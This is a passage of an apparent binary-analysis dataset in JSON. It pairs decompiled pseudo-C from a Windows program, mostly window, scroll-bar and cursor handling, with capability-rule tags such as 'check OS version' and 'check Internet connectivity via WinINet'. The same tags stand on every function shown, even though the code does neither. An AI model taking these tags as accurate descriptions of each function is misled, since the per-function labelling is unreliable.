fcn.004281d5(arg_8h_00, piVar8, iVar2);\n    var_34h = *puVar3;\n    var_30h = puVar3[1];\n    if ((arg_ch & 0x40) != 0) {\n        var_20h = in_ECX[0x27];\n        iVar6 = 0;\n        var_4h = NULL;\n        arg_10h = 0;\n        in_ECX[0x27] = 0;\n        if (0 < iVar2) {\n            var_14h = piVar8 + 1;\n            piVar4 = var_14h;\n            iVar5 = iVar2;\n            do {\n                if (((*(piVar4 + 5) & 1) != 0) && (*piVar4 != 0)) {\n                    iVar6 = iVar6 + 1;\n                }\n                piVar4 = piVar4 + 5;\n                iVar5 = iVar5 + -1;\n            } while (iVar5 != 0);\n            arg_10h = iVar6;\n            if (0 < iVar6) {\n                puVar7 = fcn.0041bab6(iVar6 * 0x18);\n                if (puVar7 == NULL) {\n                    var_4h = NULL;\n                }\n                else {\n                    arg_8h_00 = puVar7;\n                    fcn.00427eb0(puVar7, 0x18, iVar6, 0x428483);\n                    var_4h = puVar7;\n                }\n                arg_10h = 0;\n                var_8h = NULL;\n                var_10h = var_4h + 2;\n                piVar4 = var_10h;\n                do {\n                    piVar8 = piVar4;\n                    if (((*(var_14h + 5) & 1) != 0) && (*var_14h != 0)) {\n                        piVar4[-2] = var_8h;\n                        piVar4[-1] = *var_14h;\n                        (**(*in_ECX + 0x16c))(var_8h, &fcn.004287aa::lpRect);\n                        arg_8h_00 = &fcn.004287aa::lpRect;\n                        fcn.004261c2(arg_8h_00);\n                        arg_10h = arg_10h + 1;\n                        piVar8 = var_10h + 6;\n                        *piVar4 = lpRect;\n                        piVar4[1] = var_40h;\n                        piVar4[2] = var_3ch;\n                        piVar4[3] = var_38h;\n                        iVar2 = var_1ch;\n                        var_10h = piVar8;\n                    }\n                    var_8h = var_8h + 1;\n                    var_14h = var_14h + 5;\n                    piVar4 = piVar8;\n                } while (var_8h < iVar2);\n            }\n        }\n        if (((in_ECX[0x1f] & 1U) != 0) && ((in_ECX[0x1f] & 4U) != 0)) {\n            in_ECX[0x1b] = var_34h;\n        }\n        puVar7 = NULL;\n        if (0 < iVar2) {\n            var_10h = var_ch;\n            do {\n                arg_8h_00 = puVar7;\n                fcn.00427ffb(puVar7, var_10h);\n                var_10h = var_10h + 5;\n                puVar7 = puVar7 + 1;\n            } while (puVar7 < iVar2);\n        }\n        if (0 < arg_10h) {\n            piVar4 = var_4h + 2;\n            do {\n                arg_8h_00 = piVar4[-1];\n                var_1ch = fcn.0041cc4d();\n                if (var_1ch != 0) {\n                    (*_sym.imp.USER32.dll_GetWindowRect)(*(var_1ch + 0x1c), &fcn.004287aa::lpRect);\n                    iVar2 = lpRect - *piVar4;\n                    var_14h = var_40h - piVar4[1];\n                    (**(*in_ECX + 0x16c))(piVar4[-2], &fcn.004287aa::lpRect);\n                    arg_8h_00 = NULL;\n                    fcn.0041ce37(0, lpRect + iVar2, var_14h + var_40h, 0, 0, 0x15);\n                }\n                piVar4 = piVar4 + 6;\n                arg_10h = arg_10h + -1;\n            } while (arg_10h != 0);\n            fcn.0041bae1(var_4h, arg_8h_00);\n        }\n        in_ECX[0x27] = var_20h;\n        piVar8 = var_ch;\n    }\n    fcn.0041bae1(piVar8);\ncode_r0x00428a77:\n    (*_sym.imp.USER32.dll_SetRectEmpty)(&fcn.004287aa::lpRect, arg_8h_00);\n    (**(*in_ECX + 0x13c))(&fcn.004287aa::lpRect, arg_ch & 2);\n    var_30h = var_40h + (var_30h - var_38h);\n    var_34h = var_34h + (lpRect - var_3ch);\n    fcn.0042bdf6(&fcn.004287aa::var_24h, arg_ch & 1, arg_ch & 2);\n    if (var_34h <= var_24h) {\n        var_34h = var_24h;\n    }\n    if (var_30h <= var_20h) {\n        var_30h = var_20h;\n    }\n    *arg_8h = var_34h;\n    arg_8h[1] = var_30h;\n    return;\n}\n",
        "token_count": 2382
    },
    "00428f14": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_2\n\nuint __cdecl fcn.00428f14(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h_2;\n    uint var_ch_2;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    iVar1 = extraout_ECX[0x1d] + *(unaff_EBP + 8) * 0x14;\n    uVar2 = *(iVar1 + 0xc);\n    *(unaff_EBP + -0x10) = &stack0xffffffec;\n    if ((uVar2 & 1) == 0) {\n        if (*(unaff_EBP + 0xc) == 0) {\n            iVar3 = *(*(iVar1 + 0x10) + -0xc);\n        }\n        else {\n            iVar3 = fcn.0040c688(*(iVar1 + 0x10), *(unaff_EBP + 0xc));\n        }\n        if (iVar3 == 0) goto code_r0x00428fbd;\n    }\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + 0xc) == 0) {\n        fcn.004014a0();\n    }\n    else {\n        fcn.00403860(*(unaff_EBP + 0xc));\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + 0x10) == 0) {\n        *(iVar1 + 0xc) = *(iVar1 + 0xc) | 1;\n    }\n    else {\n        *(iVar1 + 0xc) = *(iVar1 + 0xc) & 0xfffffffe;\n        if ((*(iVar1 + 0xb) & 4) == 0) {\n            uVar4 = *(iVar1 + 0x10);\n        }\n        else {\n            uVar4 = 0;\n        }\n        (**(*extraout_ECX + 0x110))(0x401, *(iVar1 + 8) | *(unaff_EBP + 8), uVar4);\n    }\ncode_r0x00428fbd:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return 1;\n}\n",
        "token_count": 610
    },
    "00429159": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00429159(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (*(param_1 + 0x84) != 0) {\n        uVar1 = 0x100000;\n    }\n    if (*(param_1 + 0x88) != 0) {\n        uVar1 = uVar1 | 0x200000;\n    }\n    return uVar1;\n}\n",
        "token_count": 108
    },
    "0042a7e1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0042a7e1(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            int32_t arg_20h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint lpRect;\n    int32_t lprc1;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_20h != 0) {\n        uVar1 = 1;\n        if ((1 < arg_18h) && (1 < arg_1ch)) {\n            uVar1 = 0;\n        }\n        fcn.0041cd21((-uVar1 & 0xff800000) + 0x800000, -uVar1 & 0x800000, 0);\n    }\n    var_ch = arg_14h;\n    var_4h = arg_14h + arg_1ch;\n    lprc1 = arg_10h;\n    var_8h = arg_10h + arg_18h;\n    uVar2 = fcn.0041cd07();\n    if ((uVar2 & 0x200) == 0) {\n        iVar3 = fcn.0041bb59(0x440288);\n        if (iVar3 == 0) goto code_r0x0042a871;\n    }\n    (*_sym.imp.USER32.dll_InflateRect)(&lprc1, *0x450d48, *0x450d4c);\ncode_r0x0042a871:\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(arg_ch + 0x1c), &lpRect);\n    uVar4 = (*_sym.imp.USER32.dll_GetParent)(*(arg_ch + 0x1c), &lpRect);\n    fcn.0041eeb7(uVar4);\n    fcn.00426186();\n    iVar3 = (*_sym.imp.USER32.dll_EqualRect)(&lprc1, &lpRect);\n    if (iVar3 == 0) {\n        fcn.0041db4e(arg_8h, *(arg_ch + 0x1c), &lprc1);\n    }\n    return;\n}\n",
        "token_count": 538
    },
    "0042b1d6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042b1d6(uint noname_0, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *in_ECX;\n    int32_t iVar5;\n    int32_t *var_4h;\n    \n    var_4h = in_ECX;\n    iVar1 = (**(*in_ECX + 0x17c))(arg_ch, arg_10h);\n    (**(*in_ECX + 0x19c))(0);\n    uVar2 = fcn.0041cced();\n    if ((uVar2 & 1) != 0) {\n        if (iVar1 == 1) {\n            (**(*in_ECX + 0x150))(*(in_ECX[0x24] + 8) / 2);\n        }\n        else if (iVar1 == 2) {\n            (**(*in_ECX + 0x154))(*(in_ECX[0x23] + 8) / 2);\n        }\n        else if ((iVar1 < 0x65) || (0x73 < iVar1)) {\n            if ((iVar1 < 0xc9) || (0xd7 < iVar1)) {\n                if (iVar1 < 0x12d) {\n                    return;\n                }\n                if (0x20d < iVar1) {\n                    return;\n                }\n                piVar4 = (iVar1 + -0x12d) / 0xf;\n                iVar3 = (iVar1 + -0x12d) % 0xf;\n                iVar1 = (**(*in_ECX + 0x160))(&var_4h, &arg_10h);\n                if (iVar1 != 0) {\n                    if (arg_10h == iVar3) {\n                        iVar3 = iVar3 + 1;\n                    }\n                    if (var_4h == piVar4) {\n                        piVar4 = piVar4 + 1;\n                    }\n                }\n                (**(*in_ECX + 0x158))(piVar4);\n            }\n            else {\n                iVar3 = iVar1 + -0xc9;\n                iVar5 = (**(*in_ECX + 0x160))(0, &arg_10h);\n                if ((iVar5 != 0) && (iVar3 == arg_10h)) {\n                    iVar3 = iVar1 + -200;\n                }\n            }\n            (**(*in_ECX + 0x15c))(iVar3);\n        }\n        else {\n            iVar5 = iVar1 + -0x65;\n            iVar3 = (**(*in_ECX + 0x160))(&arg_10h, 0);\n            if ((iVar3 != 0) && (iVar5 == arg_10h)) {\n                iVar5 = iVar1 + -100;\n            }\n            (**(*in_ECX + 0x158))(iVar5);\n        }\n    }\n    return;\n}\n",
        "token_count": 659
    },
    "0042b318": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042b318(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *in_ECX;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_8h = in_ECX;\n    var_4h = in_ECX;\n    (*_sym.imp.USER32.dll_GetCursorPos)(&var_8h);\n    iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(0x11);\n    iVar3 = 0;\n    iVar5 = ((-1 < iVar2) - 1 & 0xfffffff1) + 0x10;\n    iVar6 = 0;\n    if (arg_8h == 0xd) {\n        uVar7 = 1;\n    }\n    else {\n        if (arg_8h != 0x1b) {\n            if (arg_8h == 0x25) {\n                iVar6 = -1;\n            }\n            else if (arg_8h == 0x26) {\n                iVar3 = -1;\n            }\n            else if (arg_8h == 0x27) {\n                iVar6 = 1;\n            }\n            else {\n                if (arg_8h != 0x28) {\n                    fcn.0041ee14();\n                    return;\n                }\n                iVar3 = 1;\n            }\n            iVar1 = in_ECX[0x35];\n            if ((iVar1 == 1) || ((100 < iVar1 && (iVar1 < 0x74)))) {\n                iVar6 = 0;\n            }\n            if ((iVar1 == 2) || ((200 < iVar1 && (iVar1 < 0xd8)))) {\n                iVar3 = 0;\n            }\n            var_4h = var_4h + iVar3 * iVar5;\n            var_8h = var_8h + iVar6 * iVar5;\n            (*_sym.imp.USER32.dll_ScreenToClient)(in_ECX[7], &var_8h);\n            piVar4 = in_ECX[0x2a];\n            if ((var_4h < piVar4) || (piVar4 = in_ECX[0x2c],  piVar4 < var_4h)) {\n                var_4h = piVar4;\n            }\n            piVar4 = in_ECX[0x29];\n            if ((var_8h < piVar4) || (piVar4 = in_ECX[0x2b],  piVar4 < var_8h)) {\n                var_8h = piVar4;\n            }\n            (*_sym.imp.USER32.dll_ClientToScreen)(in_ECX[7], &var_8h);\n            (*_sym.imp.USER32.dll_SetCursorPos)(var_8h, var_4h);\n            return;\n        }\n        uVar7 = 0;\n    }\n    (**(*in_ECX + 0x19c))(uVar7);\n    return;\n}\n",
        "token_count": 700
    },
    "0042b4ee": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042b4ee(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    bool bVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    int32_t iVar7;\n    int32_t iVar8;\n    bool bVar9;\n    uint uVar10;\n    uint uVar11;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar7 = 0;\n    bVar1 = false;\n    if (0 < *(in_ECX + 0x7c)) {\n        do {\n            iVar8 = 0;\n            if (0 < *(in_ECX + 0x80)) {\n                do {\n                    iVar5 = iVar7;\n                    uVar2 = fcn.00429140();\n                    piVar3 = fcn.0041bb64(0x442874, uVar2);\n                    if (((piVar3 != NULL) && (iVar4 = (**(*piVar3 + 0x70))(1),  iVar4 != 0)) &&\n                       (iVar5 = fcn.0041cdda(iVar5),  iVar5 != 0)) {\n                        bVar1 = true;\n                        goto code_r0x0042b557;\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < *(in_ECX + 0x80));\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < *(in_ECX + 0x7c));\n    }\ncode_r0x0042b557:\n    var_8h = 0;\n    if (0 < *(in_ECX + 0x7c)) {\n        do {\n            var_4h = 0;\n            if (0 < *(in_ECX + 0x80)) {\n                do {\n                    uVar2 = fcn.00429140(var_8h, var_4h);\n                    piVar3 = fcn.0041bb64(0x442874, uVar2);\n                    if (((piVar3 != NULL) && (iVar7 = (**(*piVar3 + 0x70))(bVar1),  iVar7 != 0)) &&\n                       (iVar8 = fcn.0041cdda(),  iVar8 != 0)) {\n                        uVar6 = (*_sym.imp.USER32.dll_GetScrollPos)(*(iVar7 + 0x1c), 2);\n                        uVar2 = arg_8h;\n                        uVar10 = arg_ch;\n                        uVar11 = arg_10h;\n                        fcn.00427695(arg_8h, arg_ch);\n                        if (bVar1) {\n                            iVar8 = *(in_ECX + 0x80) + -1;\n                            bVar9 = SBORROW4(var_4h, iVar8);\n                            iVar8 = var_4h - iVar8;\n                        }\n                        else {\n                            iVar8 = *(in_ECX + 0x7c) + -1;\n                            bVar9 = SBORROW4(var_8h, iVar8);\n                            iVar8 = var_8h - iVar8;\n                        }\n                        if (bVar9 != iVar8 < 0) {\n                            (*_sym.imp.USER32.dll_SetScrollPos)(*(iVar7 + 0x1c), 2, uVar6, 0, uVar2, uVar10, uVar11);\n                        }\n                    }\n                    var_4h = var_4h + 1;\n                } while (var_4h < *(in_ECX + 0x80));\n            }\n            var_8h = var_8h + 1;\n        } while (var_8h < *(in_ECX + 0x7c));\n    }\n    return 1;\n}\n",
        "token_count": 874
    },
    "0042b631": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042b631(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar2 = arg_10h;\n    uVar3 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(arg_10h + 0x1c));\n    uVar4 = (*_sym.imp.USER32.dll_GetScrollPos)(*(arg_10h + 0x1c), 2);\n    arg_10h = 0;\n    if (0 < *(in_ECX + 0x7c)) {\n        do {\n            uVar1 = *(iVar2 + 0x1c);\n            iVar5 = fcn.00429140(arg_10h, (uVar3 & 0xffff) - 0xea00);\n            (*_sym.imp.USER32.dll_SendMessageA)(*(iVar5 + 0x1c), 0x114, arg_8h & 0xffff | arg_ch << 0x10, uVar1);\n            if (arg_10h < *(in_ECX + 0x7c) + -1) {\n                (*_sym.imp.USER32.dll_SetScrollPos)(*(iVar2 + 0x1c), 2, uVar4, 0);\n            }\n            arg_10h = arg_10h + 1;\n        } while (arg_10h < *(in_ECX + 0x7c));\n    }\n    return;\n}\n",
        "token_count": 373
    },
    "0042b6c7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042b6c7(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar2 = arg_10h;\n    uVar3 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(arg_10h + 0x1c));\n    uVar4 = (*_sym.imp.USER32.dll_GetScrollPos)(*(arg_10h + 0x1c), 2);\n    arg_10h = 0;\n    if (0 < *(in_ECX + 0x80)) {\n        do {\n            uVar1 = *(iVar2 + 0x1c);\n            iVar5 = fcn.00429140((uVar3 & 0xffff) - 0xea10, arg_10h);\n            (*_sym.imp.USER32.dll_SendMessageA)(*(iVar5 + 0x1c), 0x115, arg_8h & 0xffff | arg_ch << 0x10, uVar1);\n            if (arg_10h < *(in_ECX + 0x80) + -1) {\n                (*_sym.imp.USER32.dll_SetScrollPos)(*(iVar2 + 0x1c), 2, uVar4, 0);\n            }\n            arg_10h = arg_10h + 1;\n        } while (arg_10h < *(in_ECX + 0x80));\n    }\n    return;\n}\n",
        "token_count": 372
    },
    "0042bb84": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042bb84(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    \n    if ((*(param_1 + 0x1c) != 0) && (iVar1 = fcn.004319d7(),  iVar1 != 0)) {\n        piVar2 = fcn.004319c3();\n    // WARNING: Could not recover jumptable at 0x0042bba2. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar3 = (**(*piVar2 + 0x60))();\n        return uVar3;\n    }\n    uVar3 = 0;\n    if (*(param_1 + 0x1c) == 0) {\n        if (*(param_1 + 0x4c) == 0) {\n            return 0;\n        }\n    }\n    else {\n        fcn.0041ee3b(0);\n        fcn.0041b576(*(param_1 + 0x1c));\n    }\n    if ((*(param_1 + 0x1c) != 0) || (*(param_1 + 0x4c) != 0)) {\n        if (*(param_1 + 0x4c) == 0) {\n            uVar3 = (*_sym.imp.USER32.dll_DestroyWindow)(*(param_1 + 0x1c));\n        }\n        else {\n            uVar3 = (**(**(param_1 + 0x4c) + 0x58))();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 363
    },
    "0042bcce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042bcce(int32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(param_1 + 0x7c);\n    if ((uVar1 & 0x100) != 0) {\n        *param_2 = *param_2 + *0x450d48;\n    }\n    if ((uVar1 & 0x200) != 0) {\n        param_2[1] = param_2[1] + *0x450d4c;\n    }\n    if ((uVar1 & 0x400) != 0) {\n        param_2[2] = param_2[2] - *0x450d48;\n    }\n    if ((uVar1 & 0x800) != 0) {\n        param_2[3] = param_2[3] - *0x450d4c;\n    }\n    if (param_3 == 0) {\n        *param_2 = *param_2 + *(param_1 + 0x60);\n        param_2[1] = param_2[1] + *(param_1 + 0x58);\n        param_2[2] = param_2[2] - *(param_1 + 100);\n        param_2[3] = param_2[3] - *(param_1 + 0x5c);\n        if ((*(param_1 + 0x7c) & 0x400001) == 0x400000) {\n            param_2[1] = param_2[1] + 7;\n        }\n    }\n    else {\n        *param_2 = *param_2 + *(param_1 + 0x58);\n        param_2[1] = param_2[1] + *(param_1 + 0x60);\n        param_2[2] = param_2[2] - *(param_1 + 0x5c);\n        param_2[3] = param_2[3] - *(param_1 + 100);\n        if ((*(param_1 + 0x7c) & 0x400001) == 0x400000) {\n            *param_2 = *param_2 + 7;\n        }\n    }\n    return;\n}\n",
        "token_count": 528
    },
    "0042be5e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042be5e(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t *piVar7;\n    int32_t *in_ECX;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(1);\n    if (iVar2 < 0) {\n        return;\n    }\n    iVar3 = fcn.0043500e();\n    var_8h = iVar3;\n    (*_sym.imp.USER32.dll_GetCursorPos)(&var_10h);\n    (*_sym.imp.USER32.dll_ScreenToClient)(in_ECX[7], &var_10h);\n    var_4h = (**(*in_ECX + 0x6c))(var_10h, var_ch, 0);\n    if (var_4h < 0) {\n        *(iVar3 + 0x78) = 0xffffffff;\n    }\n    else {\n        iVar4 = fcn.0041fe34();\n        iVar5 = fcn.0041fe5c();\n        if ((iVar5 == 0) || (iVar5 = fcn.0041cdda(),  iVar5 == 0)) {\n            var_4h = -1;\n        }\n        if (*(iVar3 + 0x3c) == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = *(*(iVar3 + 0x3c) + 0x1c);\n        }\n        uVar6 = (*_sym.imp.USER32.dll_GetCapture)();\n        piVar7 = fcn.0041eeb7(uVar6);\n        if (piVar7 != in_ECX) {\n            if (piVar7 == NULL) {\n                iVar5 = 0;\n            }\n            else {\n                iVar5 = piVar7[7];\n            }\n            if ((iVar5 != iVar3) && (iVar3 = fcn.0041fe34(),  iVar3 == iVar4)) {\n                var_4h = -1;\n            }\n        }\n    }\n    pcVar1 = _sym.imp.USER32.dll_KillTimer;\n    if (-1 < var_4h) {\n        (*_sym.imp.USER32.dll_ClientToScreen)(in_ECX[7], &var_10h);\n        iVar3 = (*_sym.imp.USER32.dll_WindowFromPoint)(var_10h, var_ch);\n        if (iVar3 == 0) {\ncode_r0x0042bf65:\n            var_4h = -1;\n            *(var_8h + 0x78) = 0xffffffff;\n        }\n        else if ((iVar3 != in_ECX[7]) && (iVar4 = (*_sym.imp.USER32.dll_IsChild)(in_ECX[7], iVar3),  iVar4 == 0)) {\n            iVar4 = *(var_8h + 0x3c);\n            if (iVar4 != 0) {\n                iVar4 = *(iVar4 + 0x1c);\n            }\n            if (iVar4 != iVar3) goto code_r0x0042bf65;\n        }\n        if (-1 < var_4h) goto code_r0x0042bf95;\n    }\n    if (*(var_8h + 0x78) == -1) {\n        (*pcVar1)(in_ECX[7], 0xe001);\n    }\n    (**(*in_ECX + 0x160))(0xffffffff);\ncode_r0x0042bf95:\n    if ((arg_8h == 0xe000) && ((*pcVar1)(in_ECX[7], 0xe000),  -1 < var_4h)) {\n        (**(*in_ECX + 0x160))(var_4h);\n    }\n    return;\n}\n",
        "token_count": 884
    },
    "0042c2af": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c2af(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    if ((in_ECX[0x22] != 0) && (iVar1 = (**(*in_ECX + 0x6c))(arg_ch, arg_10h, 0),  iVar1 == -1)) {\n        (*_sym.imp.USER32.dll_ClientToScreen)(in_ECX[7], &arg_ch);\n        (***in_ECX[0x23])(arg_ch, arg_10h);\n        return;\n    }\n    fcn.0041ee14();\n    return;\n}\n",
        "token_count": 156
    },
    "0042c333": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042c333(uint noname_0, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *in_ECX;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    int32_t lprcDst;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_4h = in_ECX;\n    uVar1 = (**(*in_ECX + 0x154))(arg_ch);\n    if (((uVar1 & 0x10000000) != 0) && ((uVar1 & 0xf000) != 0)) {\n        (*_sym.imp.USER32.dll_CopyRect)(&lprcDst, arg_ch + 1);\n        iVar4 = var_14h - lprcDst;\n        iVar3 = var_10h - var_18h;\n        bVar5 = arg_ch[7] != 0;\n        if (((var_4h[0x1f] & 4U) == 0) || ((var_4h[0x1f] & 1U) == 0)) {\n            if ((uVar1 & 0xa000) == 0) {\n                uVar2 = bVar5 | 0x10;\n            }\n            else {\n                uVar2 = bVar5 | 10;\n            }\n        }\n        else {\n            uVar2 = bVar5 | 6;\n        }\n        (**(*var_4h + 0x134))(&var_ch, 0xffffffff, uVar2);\n        if (iVar4 <= var_ch) {\n            var_ch = iVar4;\n        }\n        if (iVar3 <= var_8h) {\n            var_8h = iVar3;\n        }\n        if ((uVar1 & 0xa000) == 0) {\n            if ((uVar1 & 0x5000) != 0) {\n                arg_ch[5] = arg_ch[5] + var_ch;\n                iVar3 = arg_ch[6];\n                if (arg_ch[6] <= var_8h) {\n                    iVar3 = var_8h;\n                }\n                arg_ch[6] = iVar3;\n                if ((uVar1 & 0x1000) == 0) {\n                    if ((uVar1 & 0x4000) != 0) {\n                        lprcDst = var_14h - var_ch;\n                        arg_ch[3] = arg_ch[3] - var_ch;\n                    }\n                }\n                else {\n                    arg_ch[1] = arg_ch[1] + var_ch;\n                }\n            }\n        }\n        else {\n            arg_ch[6] = arg_ch[6] + var_8h;\n            iVar3 = arg_ch[5];\n            if (arg_ch[5] <= var_ch) {\n                iVar3 = var_ch;\n            }\n            arg_ch[5] = iVar3;\n            if ((uVar1 & 0x2000) == 0) {\n                if ((uVar1 & 0x8000) != 0) {\n                    var_18h = var_10h - var_8h;\n                    arg_ch[4] = arg_ch[4] - var_8h;\n                }\n            }\n            else {\n                arg_ch[2] = arg_ch[2] + var_8h;\n            }\n        }\n        var_14h = var_ch + lprcDst;\n        var_10h = var_18h + var_8h;\n        if (*arg_ch != 0) {\n            fcn.0041db4e(arg_ch, var_4h[7], &lprcDst);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 868
    },
    "0042cbbe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
